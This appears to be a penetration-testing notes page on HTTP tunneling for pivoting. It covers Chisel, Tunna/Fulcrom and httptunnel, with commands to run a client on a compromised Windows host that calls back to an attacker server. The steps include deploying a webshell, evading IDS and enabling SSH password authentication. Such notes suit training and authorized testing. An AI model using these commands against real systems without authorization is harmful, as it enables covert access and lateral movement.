# ⭕ HTTP Tunneling

## <mark style="color:red;">Chisel</mark>

{% embed url="https://github.com/jpillora/chisel" %}

Chisel is an open-source tunneling software written in Golang. <mark style="color:green;">**It works by setting up a TCP tunnel and performing data transfers over HTTP, while securing it with SSH.**</mark> Chisel contains both client and server components and creates a SOCKS-compliant proxy.

{% hint style="danger" %}
In this technique, the compiled Chisel binary will be dropped on the compromised system,

so this is not an OPSEC-safe technique.
{% endhint %}

```
sudo apt install golang -y
git clone https://github.com/jpillora/chisel.git
cd chisel/
go build
```

We can cross-compile chisel for other operating systems and architectures with the Golang compiler

```
env GOOS=windows GOARCH=amd64 go build -o chisel.exe -ldflags "-s -w"
```

Now we can use chisel to set up the reverse tunnel.

start chisel in server mode, specify the listen port with -p and --socks5 to specify the SOCKS proxy mode.

```
./chisel server -p 8080 --socks5
```

configure a SOCKS proxy server with the Kali SSH server.

enable password authentication by uncommenting the appropriate line in the `sshd_config` file. After the service is started onnect to it with ssh and supply -N to ensure commands are not executed but merely forwarded and -D to configure a SOCKS proxy.specify the IP and port to configure the SOCKS proxy.

```
sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/g' /etc/ssh/sshd_config
sudo systemctl start ssh.service
ssh -N -D 0.0.0.0:1080 localhost
```

transfer the compiled Windows version of chisel to the Windows machine through the existing reverse shell and run it:

```
chisel.exe client 192.168.119.120:8080 socks
```

use the tunnel:

```
sudo proxychains rdesktop 192.168.120.10
```

## <mark style="color:red;">Tunna / Fulcrom</mark>

```
# Everything is through HTTP
# Bypass some IPS/IDS

# First step is to deploy webshell on the target
# Some are available with the tool (but not good)
# Can be hard to use

# Then on the attacker machine
$ python2 proxy.py -u http://192.168.2.105:8080/conn.php -l 7777 -r 80 -a 10.42.42.2 -v
```

## <mark style="color:red;">HTS</mark>

```
apt  install httptunnel
hts --forward-port localhost:8888 1234 # server side
 htc --forward-port 8080 10.11.0.128:1234 # client side
```
